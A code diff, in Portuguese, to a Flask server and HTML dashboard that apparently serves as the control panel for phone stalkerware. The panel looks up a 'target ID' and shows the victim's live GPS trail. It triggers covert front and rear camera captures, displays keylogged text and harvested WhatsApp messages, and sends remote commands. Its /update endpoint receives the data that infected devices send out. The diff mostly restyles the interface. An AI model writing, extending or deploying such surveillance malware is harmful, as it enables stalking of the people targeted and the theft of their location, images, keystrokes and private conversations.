@@ -14,129 +14,241 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>NEXOS // PAINEL DE MONITORAMENTO</title>
+    <title>NEXOS // PAINEL DE CONTROLE</title>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <style>
+        :root {
+            --bg: #0d1117;
+            --bg-card: #161b22;
+            --border: #30363d;
+            --text: #c9d1d9;
+            --text-dim: #8b949e;
+            --accent: #58a6ff;
+            --green: #3fb950;
+            --orange: #d2991d;
+            --red: #f85149;
+            --font: 'Segoe UI', 'Courier New', monospace;
+        }
         * { box-sizing: border-box; margin: 0; padding: 0; }
-        body { background: #0a0a0a; color: #e2e8f0; font-family: 'Courier New', monospace; padding: 15px; }
-        .wrapper { max-width: 900px; margin: 0 auto; }
-        .header { text-align: center; margin-bottom: 20px; padding: 10px; border-bottom: 2px solid #1e293b; }
-        .header h1 { font-size: 20px; color: #38bdf8; letter-spacing: 3px; font-weight: bold; }
-        .search-box { background: #111; border: 1px solid #1e293b; padding: 20px; border-radius: 12px; text-align: center; margin-bottom: 20px; }
-        .search-box input { width: 100%; max-width: 300px; background: #0a0a0a; border: 1px solid #1e293b; padding: 12px; color: #34d399; font-weight: bold; text-align: center; border-radius: 6px; font-size: 16px; margin-bottom: 15px; letter-spacing: 2px; }
-        .search-box button { background: #38bdf8; color: #0a0a0a; font-weight: bold; border: none; padding: 12px 30px; border-radius: 6px; cursor: pointer; text-transform: uppercase; font-size: 13px; }
-        .device-section { border: 1px solid #1e293b; border-radius: 12px; background: #111; padding: 15px; margin-bottom: 20px; }
-        .device-title { font-size: 14px; color: #34d399; text-transform: uppercase; border-bottom: 1px solid #1e293b; padding-bottom: 6px; margin-bottom: 12px; display: flex; justify-content: space-between; }
-        .info-grid { display: grid; grid-template-columns: 1fr 1fr 1fr 1fr; gap: 10px; margin-bottom: 12px; }
-        @media(max-width: 600px) { .info-grid { grid-template-columns: 1fr 1fr; } }
-        .info-box { background: #0a0a0a; border: 1px solid #1e293b; padding: 12px; border-radius: 6px; text-align: center; }
-        .info-box span { font-size: 10px; color: #64748b; display: block; text-transform: uppercase; margin-bottom: 4px; }
-        .info-box strong { font-size: 18px; color: #f1f5f9; }
-        .map-container { width: 100%; height: 300px; border-radius: 8px; border: 1px solid #1e293b; margin-bottom: 10px; }
-        .btn-row { display: flex; gap: 8px; margin-bottom: 15px; flex-wrap: wrap; }
-        .btn-maps { flex: 1; background: #22c55e; color: #fff; text-align: center; padding: 12px; border-radius: 8px; font-weight: bold; text-decoration: none; text-transform: uppercase; font-size: 11px; min-width: 70px; }
-        .btn-cmd { background: #f59e0b; color: #000; border: none; padding: 12px; border-radius: 8px; font-weight: bold; text-transform: uppercase; font-size: 11px; cursor: pointer; flex: 1; min-width: 70px; }
-        .btn-camera { display: block; width: 100%; background: #38bdf8; color: #0a0a0a; border: none; text-align: center; padding: 14px; border-radius: 8px; font-weight: bold; text-transform: uppercase; font-size: 13px; cursor: pointer; margin-bottom: 10px; }
-        .btn-camera:disabled { opacity: 0.5; cursor: not-allowed; }
-        .cameras-row { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 15px; }
-        @media(max-width: 600px) { .cameras-row { grid-template-columns: 1fr; } }
-        .cam-card { background: #0a0a0a; border: 1px solid #1e293b; border-radius: 8px; overflow: hidden; }
-        .cam-card-title { background: #111; padding: 8px; font-size: 11px; color: #64748b; border-bottom: 1px solid #1e293b; font-weight: bold; text-transform: uppercase; }
+        body { background: #0d1117; color: var(--text); font-family: var(--font); font-size: 13px; display: flex; min-height: 100vh; }
+        
+        /* MENU LATERAL */
+        .sidebar {
+            width: 220px; background: #161b22; border-right: 1px solid #30363d;
+            padding: 15px 0; display: flex; flex-direction: column; flex-shrink: 0;
+        }
+        .sidebar-logo {
+            padding: 10px 15px 20px; font-size: 16px; font-weight: bold; color: #58a6ff;
+            border-bottom: 1px solid #30363d; margin-bottom: 10px; letter-spacing: 2px;
+        }
+        .sidebar-nav { display: flex; flex-direction: column; }
+        .sidebar-nav a {
+            color: #8b949e; text-decoration: none; padding: 10px 15px; font-size: 12px;
+            border-left: 3px solid transparent; transition: all 0.2s;
+        }
+        .sidebar-nav a:hover, .sidebar-nav a.active {
+            color: #c9d1d9; background: #1c2128; border-left-color: #58a6ff;
+        }
+        .sidebar-nav a .icon { margin-right: 8px; }
+        
+        /* MAIN */
+        .main-content { flex: 1; padding: 15px; overflow-y: auto; }
+        
+        /* HEADER */
+        .topbar {
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 10px 0; border-bottom: 1px solid #30363d; margin-bottom: 15px;
+        }
+        .topbar h1 { font-size: 18px; color: #58a6ff; letter-spacing: 1px; }
+        .topbar .btn-sair {
+            background: #d2991d; color: #000; border: none; padding: 8px 16px;
+            border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 12px;
+        }
+        
+        /* GRID CARDS */
+        .cards-grid {
+            display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 15px;
+        }
+        @media(max-width: 768px) { .cards-grid { grid-template-columns: 1fr; } .sidebar { display: none; } }
+        
+        .card {
+            background: #161b22; border: 1px solid #30363d; border-radius: 8px;
+            overflow: hidden;
+        }
+        .card-header {
+            background: #1c2128; padding: 10px 12px; font-size: 11px; font-weight: bold;
+            color: #58a6ff; text-transform: uppercase; border-bottom: 1px solid #30363d;
+            letter-spacing: 1px;
+        }
+        .card-body { padding: 0; }
+        
+        /* CÂMERA */
         .cam-frame { width: 100%; aspect-ratio: 4/3; background: #000; display: flex; align-items: center; justify-content: center; }
         .cam-frame img { width: 100%; height: 100%; object-fit: cover; display: none; }
-        .cam-placeholder { font-size: 11px; color: #334155; text-transform: uppercase; }
+        .cam-placeholder { color: #484f58; font-size: 12px; text-transform: uppercase; }
         
-        .whatsapp-section { margin-bottom: 15px; }
-        .whatsapp-section h3 { color: #25d366; font-size: 13px; margin-bottom: 8px; }
-        .chat-list { display: flex; flex-direction: column; gap: 6px; }
-        .chat-card { background: #0a0a0a; border: 1px solid #1e293b; border-radius: 8px; overflow: hidden; cursor: pointer; }
-        .chat-card:hover { border-color: #25d366; }
-        .chat-card-header { display: flex; justify-content: space-between; align-items: center; padding: 10px 12px; }
-        .chat-card-header .pessoa { color: #25d366; font-weight: bold; font-size: 12px; }
-        .chat-card-header .info { display: flex; gap: 10px; align-items: center; }
-        .chat-card-header .total { background: #25d366; color: #000; padding: 2px 8px; border-radius: 10px; font-size: 10px; font-weight: bold; }
-        .chat-card-header .ultima { color: #64748b; font-size: 10px; max-width: 150px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
-        .chat-card-body { display: none; padding: 0 12px 10px 12px; max-height: 250px; overflow-y: auto; }
-        .chat-card.aberto .chat-card-body { display: block; }
-        .chat-msg { padding: 6px 0; border-bottom: 1px solid #1e293b; font-size: 11px; }
-        .chat-msg.recebida { color: #94a3b8; }
-        .chat-msg.midia { color: #f59e0b; }
-        .chat-msg .hora { color: #64748b; font-size: 9px; }
+        /* MAPA */
+        .map-container { width: 100%; height: 300px; }
         
-        .keylog-box { background: #0a0a0a; border: 2px solid #ef4444; padding: 10px; border-radius: 8px; margin-bottom: 15px; }
-        .keylog-box.ativo { border-color: #22c55e; animation: pulse 1s infinite; }
-        .keylog-box .app-nome { color: #f59e0b; font-weight: bold; text-transform: uppercase; }
-        .keylog-box .keylog-texto { color: #38bdf8; font-size: 12px; margin-top: 5px; word-break: break-all; }
+        /* MENSAGENS */
+        .msg-list { padding: 8px; max-height: 250px; overflow-y: auto; }
+        .msg-item { display: flex; align-items: center; gap: 8px; padding: 6px 0; border-bottom: 1px solid #21262d; cursor: pointer; }
+        .msg-item:hover { background: #1c2128; }
+        .msg-avatar { width: 32px; height: 32px; border-radius: 50%; background: #30363d; display: flex; align-items: center; justify-content: center; font-size: 14px; flex-shrink: 0; }
+        .msg-info { flex: 1; min-width: 0; }
+        .msg-nome { font-size: 12px; font-weight: bold; color: #c9d1d9; }
+        .msg-texto { font-size: 11px; color: #8b949e; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+        .msg-detalhe { display: none; padding: 8px 0 0 40px; font-size: 11px; color: #c9d1d9; }
+        .msg-item.aberto .msg-detalhe { display: block; }
         
-        .distancia-box { background: #0a0a0a; border: 2px solid #38bdf8; padding: 10px; border-radius: 8px; margin-bottom: 15px; text-align: center; }
-        .distancia-box p { font-size: 14px; color: #38bdf8; font-weight: bold; }
+        /* STATUS BAR */
+        .status-bar {
+            background: #161b22; border: 1px solid #30363d; border-radius: 8px;
+            padding: 10px 15px; display: flex; gap: 20px; flex-wrap: wrap;
+            font-size: 11px; color: #8b949e; margin-bottom: 15px;
+        }
+        .status-bar span { color: #c9d1d9; font-weight: bold; }
+        .status-bar .dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; margin-right: 5px; }
+        .dot.online { background: #3fb950; box-shadow: 0 0 6px #3fb950; }
         
-        .error-box { background: #450a0a; border: 1px solid #991b1b; padding: 15px; border-radius: 8px; text-align: center; margin-bottom: 20px; }
-        .error-box p { color: #fca5a5; font-weight: bold; }
-        .status-dot { display: inline-block; width: 10px; height: 10px; border-radius: 50%; margin-right: 5px; }
-        .status-online { background: #22c55e; box-shadow: 0 0 10px #22c55e; animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+        /* BOTÕES */
+        .btn-row { display: flex; gap: 8px; margin-bottom: 15px; flex-wrap: wrap; }
+        .btn {
+            padding: 10px 16px; border-radius: 6px; font-size: 12px; font-weight: bold;
+            cursor: pointer; border: none; text-transform: uppercase; letter-spacing: 1px;
+        }
+        .btn-primary { background: #238636; color: #fff; }
+        .btn-accent { background: #1f6feb; color: #fff; }
+        .btn-warn { background: #d2991d; color: #000; }
+        
+        .keylog-bar {
+            background: #161b22; border: 1px solid #f85149; padding: 8px 12px;
+            border-radius: 6px; font-size: 11px; margin-bottom: 15px;
+        }
+        .keylog-bar.ativo { border-color: #3fb950; }
+        .keylog-bar .app-tag { color: #d2991d; font-weight: bold; text-transform: uppercase; }
+        
+        .dist-box {
+            background: #161b22; border: 1px solid #30363d; border-radius: 8px;
+            padding: 10px 15px; text-align: center; margin-bottom: 15px;
+        }
+        .dist-box .valor { font-size: 20px; color: #58a6ff; font-weight: bold; }
+        .dist-box .label { font-size: 10px; color: #8b949e; text-transform: uppercase; }
+        
+        .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 12px; }
+        .info-card { background: #161b22; border: 1px solid #30363d; padding: 12px; border-radius: 6px; text-align: center; }
+        .info-card .valor { font-size: 18px; font-weight: bold; color: #c9d1d9; }
+        .info-card .label { font-size: 10px; color: #8b949e; text-transform: uppercase; }
+        
+        .search-box { background: #161b22; border: 1px solid #30363d; padding: 15px; border-radius: 8px; text-align: center; margin-bottom: 15px; }
+        .search-box input { width: 100%; max-width: 350px; background: #0d1117; border: 1px solid #30363d; padding: 10px; color: #c9d1d9; text-align: center; border-radius: 6px; font-size: 14px; margin-bottom: 10px; }
+        .search-box button { background: #238636; color: #fff; font-weight: bold; border: none; padding: 10px 25px; border-radius: 6px; cursor: pointer; font-size: 12px; text-transform: uppercase; }
+        
+        .error-box { background: #490202; border: 1px solid #f85149; padding: 12px; border-radius: 6px; text-align: center; margin-bottom: 15px; color: #f85149; }
     </style>
 </head>
 <body>
-    <div class="wrapper">
-        <div class="header"><h1>NEXOS // PAINEL DE MONITORAMENTO</h1></div>
+    <!-- MENU LATERAL -->
+    <div class="sidebar">
+        <div class="sidebar-logo">⚡ NEXOS CORE</div>
+        <nav class="sidebar-nav">
+            <a href="#" class="active"><span class="icon">📊</span> Painel Geral</a>
+            <a href="#"><span class="icon">📸</span> Câmeras</a>
+            <a href="#"><span class="icon">📍</span> Localização GPS</a>
+            <a href="#"><span class="icon">💬</span> Mensagens</a>
+            <a href="#"><span class="icon">📞</span> Chamadas</a>
+            <a href="#"><span class="icon">🌐</span> Navegador</a>
+            <a href="#"><span class="icon">📁</span> Arquivos</a>
+            <a href="#"><span class="icon">📱</span> Aplicativos</a>
+            <a href="#"><span class="icon">🎤</span> Gravação</a>
+        </nav>
+    </div>
+    
+    <!-- CONTEÚDO PRINCIPAL -->
+    <div class="main-content">
+        <div class="topbar">
+            <h1>⚡ NEXOS // PAINEL DE CONTROLE</h1>
+        </div>
+        
         <div class="search-box">
-            <p>DIGITE O SEU TARGET ID PARA ACESSAR O MONITORAMENTO</p>
-            <form id="searchForm" method="POST">
-                <input type="text" id="target_id" name="target_id" placeholder="EX: NX-A4B7D1" value="{{ id_buscado if id_buscado else '' }}" required><br>
+            <p style="color:#8b949e;margin-bottom:8px;">DIGITE O TARGET ID PARA CONECTAR</p>
+            <form method="POST">
+                <input type="text" name="target_id" placeholder="EX: NX-A4B7D1" value="{{ id_buscado if id_buscado else '' }}" required><br>
                 <button type="submit">Conectar Sinal</button>
             </form>
         </div>
+        
         {% if erro %}<div class="error-box"><p>⚠️ {{ erro }}</p></div>{% endif %}
+        
         {% if info_moto %}
-            <div class="device-section">
-                <div class="device-title">
-                    <span><span class="status-dot status-online"></span> CONEXAO ATIVA // {{ id_buscado }}</span>
-                    <span style="background: #166534; color: #4ade80; padding: 4px 10px; border-radius: 4px; font-size: 11px;">ONLINE</span>
-                </div>
-                <div class="info-grid">
-                    <div class="info-box"><span>🔋 Bateria</span><strong id="txt_bateria" style="color: #22c55e;">{{ info_moto.battery }}%</strong></div>
-                    <div class="info-box"><span>⏱️ Ativo</span><strong id="txt_uptime">{{ info_moto.get('uptime', '--') }}</strong></div>
-                    <div class="info-box"><span>📶 Rede</span><strong id="txt_network">{{ info_moto.get('network', '--') }}</strong></div>
-                    <div class="info-box"><span>🛣️ Distância</span><strong id="txt_distancia" style="color: #38bdf8;">0 km</strong></div>
-                </div>
-                <div id="map_private" class="map-container"></div>
-                <div class="btn-row">
-                    <a id="lnk_maps" href="https://www.google.com/maps?q={{ info_moto.lat }},{{ info_moto.lon }}" target="_blank" class="btn-maps">🗺️ Maps</a>
-                    <button class="btn-cmd" onclick="enviarComando('vibrar')">📳</button>
-                    <button class="btn-cmd" onclick="enviarComando('som')">🔊</button>
-                    <button class="btn-cmd" onclick="enviarComando('lanterna')">💡</button>
-                </div>
-                <div class="distancia-box">
-                    <p>🛣️ Distância percorrida: <span id="distanciaTotal">0.00</span> km</p>
-                </div>
-                <button id="btnCam" class="btn-camera" onclick="dispararCapturaDupla()">📸 Captura Sincronizada</button>
-                
-                <div id="keylogBox" class="keylog-box">
-                    <p>⌨️ Nenhum app monitorado aberto</p>
-                </div>
-                
-                <div class="whatsapp-section">
-                    <h3>💬 WhatsApp</h3>
-                    <div id="chatList" class="chat-list">
-                        <p style="color:#64748b;font-size:11px;">Nenhuma conversa recente</p>
+            <!-- STATUS BAR -->
+            <div class="status-bar">
+                <span>🟢 ONLINE</span> |
+                Última atualização: <span id="txt_uptime">{{ info_moto.get('uptime', '--') }}</span> |
+                🔋 Bateria: <span id="txt_bateria">{{ info_moto.battery }}%</span> |
+                📶 Conexão: <span id="txt_network">{{ info_moto.get('network', '--') }}</span> |
+                🛣️ Distância: <span id="distanciaTotal">0.00</span> km
+            </div>
+            
+            <!-- INFO RÁPIDA -->
+            <div class="info-grid">
+                <div class="info-card"><div class="label">🔋 Bateria</div><div class="valor" id="info_bateria" style="color:#3fb950;">{{ info_moto.battery }}%</div></div>
+                <div class="info-card"><div class="label">🛣️ Distância</div><div class="valor" id="info_distancia" style="color:#58a6ff;">0 km</div></div>
+            </div>
+            
+            <!-- CÂMERAS -->
+            <div class="cards-grid">
+                <div class="card">
+                    <div class="card-header">🎥 Câmera Frontal - Em Tempo Real</div>
+                    <div class="card-body">
+                        <div class="cam-frame">
+                            <span id="labelFront" class="cam-placeholder">Sem Sinal</span>
+                            <img id="imgFront" src="" alt="Frontal">
+                        </div>
                     </div>
                 </div>
-                
-                <div class="cameras-row">
-                    <div class="cam-card"><div class="cam-card-title">🎥 Câmera Frontal</div><div class="cam-frame"><span id="labelFront" class="cam-placeholder">Sem Sinal</span><img id="imgFront" src="" alt="Frontal"></div></div>
-                    <div class="cam-card"><div class="cam-card-title">🎥 Câmera Traseira</div><div class="cam-frame"><span id="labelBack" class="cam-placeholder">Sem Sinal</span><img id="imgBack" src="" alt="Traseira"></div></div>
+                <div class="card">
+                    <div class="card-header">🎥 Câmera Traseira - Em Tempo Real</div>
+                    <div class="card-body">
+                        <div class="cam-frame">
+                            <span id="labelBack" class="cam-placeholder">Sem Sinal</span>
+                            <img id="imgBack" src="" alt="Traseira">
+                        </div>
+                    </div>
                 </div>
             </div>
+            
+            <!-- BOTÕES -->
+            <div class="btn-row">
+                <button class="btn btn-primary" onclick="dispararCapturaDupla()">📸 Capturar</button>
+                <button class="btn btn-accent" onclick="enviarComando('vibrar')">📳 Vibrar</button>
+                <button class="btn btn-accent" onclick="enviarComando('som')">🔊 Som</button>
+                <button class="btn btn-accent" onclick="enviarComando('lanterna')">💡 Lanterna</button>
+                <a id="lnk_maps" href="https://www.google.com/maps?q={{ info_moto.lat }},{{ info_moto.lon }}" target="_blank" class="btn btn-accent" style="text-decoration:none;">🗺️ Google Maps</a>
+            </div>
+            
+            <!-- MAPA -->
+            <div class="card" style="margin-bottom:15px;">
+                <div class="card-header">📍 Localização GPS Recente</div>
+                <div class="card-body"><div id="map_private" class="map-container"></div></div>
+            </div>
+            
+            <!-- KEYLOGGER -->
+            <div id="keylogBox" class="keylog-bar"><p>⌨️ Nenhum app monitorado aberto</p></div>
+            
+            <!-- MENSAGENS -->
+            <div class="card" style="margin-bottom:15px;">
+                <div class="card-header">💬 Últimas Mensagens</div>
+                <div class="card-body"><div id="chatList" class="msg-list"><p style="color:#484f58;">Nenhuma mensagem recente</p></div></div>
+            </div>
+            
             <script>
                 let map = L.map('map_private', { zoomControl: true }).setView([{{ info_moto.lat }}, {{ info_moto.lon }}], 17);
-                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {attribution: '© OpenStreetMap'}).addTo(map);
                 let marker = L.marker([{{ info_moto.lat }}, {{ info_moto.lon }}]).addTo(map);
-                let historico = L.polyline([], {color: '#38bdf8', weight: 3}).addTo(map);
+                let historico = L.polyline([], {color: '#58a6ff', weight: 3}).addTo(map);
                 let pontos = [[{{ info_moto.lat }}, {{ info_moto.lon }}]];
-                let paradas = [];
                 let chatsAbertos = {};
                 
                 function enviarComando(acao) {
@@ -146,18 +258,13 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                     });
                 }
                 
-                function toggleChat(pessoa, card) {
-                    if (card.classList.contains('aberto')) {
-                        card.classList.remove('aberto');
-                        delete chatsAbertos[pessoa];
-                    } else {
-                        card.classList.add('aberto');
-                        chatsAbertos[pessoa] = true;
-                    }
+                function toggleMsg(id, el) {
+                    if(el.classList.contains('aberto')) { el.classList.remove('aberto'); delete chatsAbertos[id]; }
+                    else { el.classList.add('aberto'); chatsAbertos[id] = true; }
                 }
                 
                 async function dispararCapturaDupla() {
-                    const btn = document.getElementById('btnCam');
+                    const btn = event.target;
                     btn.innerText = "⏳ Sincronizando..."; btn.disabled = true;
                     try {
                         await fetch('/api/comando_camera/{{ id_buscado }}', { method: 'POST', body: JSON.stringify({acao: 'take_dual'}), headers: {'Content-Type': 'application/json'} });
@@ -169,12 +276,12 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                                     const d = await r.json();
                                     if(d.photo_back) { document.getElementById('labelBack').style.display = "none"; document.getElementById('imgBack').src = "data:image/jpeg;base64," + d.photo_back; document.getElementById('imgBack').style.display = "block"; }
                                     if(d.photo_front) { document.getElementById('labelFront').style.display = "none"; document.getElementById('imgFront').src = "data:image/jpeg;base64," + d.photo_front; document.getElementById('imgFront').style.display = "block"; }
-                                    if(d.pronto) { clearInterval(c); btn.innerText = "📸 Captura Sincronizada"; btn.disabled = false; }
+                                    if(d.pronto) { clearInterval(c); btn.innerText = "📸 Capturar"; btn.disabled = false; }
                                 }
-                                t++; if(t > 40) { clearInterval(c); btn.innerText = "📸 Captura Sincronizada"; btn.disabled = false; }
+                                t++; if(t > 40) { clearInterval(c); btn.innerText = "📸 Capturar"; btn.disabled = false; }
                             } catch(e){}
                         }, 1500);
-                    } catch(e) { btn.innerText = "📸 Captura Sincronizada"; btn.disabled = false; }
+                    } catch(e) { btn.innerText = "📸 Capturar"; btn.disabled = false; }
                 }
                 
                 setInterval(async () => {
@@ -183,67 +290,43 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                         if (r.ok) {
                             const d = await r.json();
                             document.getElementById('txt_bateria').innerText = d.battery + '%';
+                            document.getElementById('info_bateria').innerText = d.battery + '%';
                             document.getElementById('txt_uptime').innerText = d.uptime || '--';
                             document.getElementById('txt_network').innerText = d.network || '--';
                             document.getElementById('distanciaTotal').innerText = (d.distancia_total || 0).toFixed(2);
-                            document.getElementById('txt_distancia').innerText = (d.distancia_total || 0).toFixed(2) + ' km';
+                            document.getElementById('info_distancia').innerText = (d.distancia_total || 0).toFixed(2) + ' km';
                             
                             let lat = parseFloat(d.lat), lon = parseFloat(d.lon);
                             if (lat && lon) {
                                 marker.setLatLng([lat, lon]); map.panTo([lat, lon]);
                                 document.getElementById('lnk_maps').href = 'https://www.google.com/maps?q=' + lat + ',' + lon;
-                                
-                                // Linha infinita (sem limite)
-                                pontos.push([lat, lon]);
-                                historico.setLatLngs(pontos);
-                                
-                                // Bolinha vermelha de parada
-                                if(d.ponto_parada) {
-                                    let paradaMarker = L.circleMarker([lat, lon], {
-                                        radius: 8, color: '#ef4444', fillColor: '#ef4444', fillOpacity: 0.6, weight: 2
-                                    }).addTo(map);
-                                    paradaMarker.bindPopup('🔴 Parada<br>' + d.tempo_parado + 's parado');
-                                    paradas.push(paradaMarker);
-                                    if(paradas.length > 20) {
-                                        map.removeLayer(paradas.shift());
-                                    }
-                                }
+                                pontos.push([lat, lon]); historico.setLatLngs(pontos);
                             }
                             
                             // KEYLOGGER
                             let kb = document.getElementById('keylogBox');
                             if(d.keylog && d.keylog.ativo) {
-                                kb.className = 'keylog-box ativo';
-                                let textoHtml = d.keylog.texto ? `<div class="keylog-texto">📝 ${d.keylog.texto}</div>` : '';
-                                kb.innerHTML = `<p>⌨️ <span class="app-nome">${d.keylog.app}</span> monitorado${textoHtml}</p>`;
-                            } else {
-                                kb.className = 'keylog-box';
-                                kb.innerHTML = '<p>⌨️ Nenhum app monitorado aberto</p>';
-                            }
+                                kb.className = 'keylog-bar ativo';
+                                kb.innerHTML = `<p>⌨️ <span class="app-tag">${d.keylog.app}</span> monitorado${d.keylog.texto ? ' - '+d.keylog.texto.substring(0,80) : ''}</p>`;
+                            } else { kb.className = 'keylog-bar'; kb.innerHTML = '<p>⌨️ Nenhum app monitorado aberto</p>'; }
                             
-                            // WHATSAPP
+                            // MENSAGENS
                             if(d.whatsapp && d.whatsapp.length > 0) {
                                 let html = '';
                                 d.whatsapp.forEach(chat => {
-                                    let temMidia = chat.midia ? '📎 ' : '';
                                     let aberto = chatsAbertos[chat.pessoa] ? ' aberto' : '';
-                                    html += `<div class="chat-card${aberto}" onclick="toggleChat('${chat.pessoa}', this)">
-                                        <div class="chat-card-header">
-                                            <span class="pessoa">👤 ${chat.pessoa}</span>
-                                            <div class="info">
-                                                <span class="ultima">${temMidia}${chat.ultima_msg || ''}</span>
-                                                <span class="total">${chat.total}</span>
-                                            </div>
-                                        </div>
-                                        <div class="chat-card-body">`;
+                                    html += `<div class="msg-item${aberto}" onclick="toggleMsg('${chat.pessoa}', this)">
+                                        <div class="msg-avatar">👤</div>
+                                        <div class="msg-info">
+                                            <div class="msg-nome">${chat.pessoa} <span style="font-size:10px;color:#8b949e;">(${chat.total})</span></div>
+                                            <div class="msg-texto">${chat.midia ? '📎 ' : ''}${chat.ultima_msg || ''}</div>
+                                            <div class="msg-detalhe">`;
                                     if(chat.mensagens) {
                                         chat.mensagens.slice().reverse().forEach(msg => {
-                                            let cls = 'chat-msg ' + (msg.tipo || 'recebida');
-                                            if(msg.midia) cls += ' midia';
-                                            html += `<div class="${cls}"><span>${msg.tipo === 'enviada' ? '📤' : '📥'}</span> ${msg.texto} <span class="hora">${msg.hora}</span></div>`;
+                                            html += `<div style="padding:3px 0;border-bottom:1px solid #21262d;">📥 ${msg.texto} <span style="color:#484f58;font-size:9px;">${msg.hora}</span></div>`;
                                         });
                                     }
-                                    html += `</div></div>`;
+                                    html += `</div></div></div>`;
                                 });
                                 document.getElementById('chatList').innerHTML = html;
                             }
@@ -271,15 +354,7 @@ def api_status(device_id):
     device_id = device_id.upper()
     if device_id in db_dispositivos:
         d = db_dispositivos[device_id]
-        return jsonify({
-            "battery": d.get("battery","N/A"), "uptime": d.get("uptime","N/A"),
-            "lat": d.get("lat",0), "lon": d.get("lon",0),
-            "network": d.get("network","N/A"), "whatsapp": d.get("whatsapp",[]),
-            "keylog": d.get("keylog"),
-            "distancia_total": d.get("distancia_total", 0),
-            "ponto_parada": d.get("ponto_parada", False),
-            "tempo_parado": d.get("tempo_parado", 0)
-        }), 200
+        return jsonify({"battery": d.get("battery","N/A"), "uptime": d.get("uptime","N/A"), "lat": d.get("lat",0), "lon": d.get("lon",0), "network": d.get("network","N/A"), "whatsapp": d.get("whatsapp",[]), "keylog": d.get("keylog"), "distancia_total": d.get("distancia_total", 0)}), 200
     return jsonify({"error": "Not found"}), 404
 
 @app.route('/update', methods=['POST'])
@@ -288,16 +363,7 @@ def update():
     device_id = data.get('device_id', '').upper()
     if not device_id: return jsonify({"status": "error"}), 400
     if device_id not in db_dispositivos: db_dispositivos[device_id] = {}
-    db_dispositivos[device_id].update({
-        "battery": data.get("battery","N/A"), "uptime": data.get("uptime","N/A"),
-        "lat": float(data.get("lat",-16.6869)), "lon": float(data.get("lon",-49.2648)),
-        "network": data.get("network","N/A"), "whatsapp": data.get("whatsapp",[]),
-        "keylog": data.get("keylog"),
-        "distancia_total": data.get("distancia_total", 0),
-        "ponto_parada": data.get("ponto_parada", False),
-        "tempo_parado": data.get("tempo_parado", 0),
-        "last_seen": datetime.utcnow().isoformat()
-    })
+    db_dispositivos[device_id].update({"battery": data.get("battery","N/A"), "uptime": data.get("uptime","N/A"), "lat": float(data.get("lat",-16.6869)), "lon": float(data.get("lon",-49.2648)), "network": data.get("network","N/A"), "whatsapp": data.get("whatsapp",[]), "keylog": data.get("keylog"), "distancia_total": data.get("distancia_total", 0), "last_seen": datetime.utcnow().isoformat()})
     cmd_cam = db_dispositivos[device_id].get("cmd_cam", "wait")
     cmd_remoto = db_dispositivos[device_id].get("cmd_remoto", "none")
     db_dispositivos[device_id]["cmd_cam"] = "wait"; db_dispositivos[device_id]["cmd_remoto"] = "none"
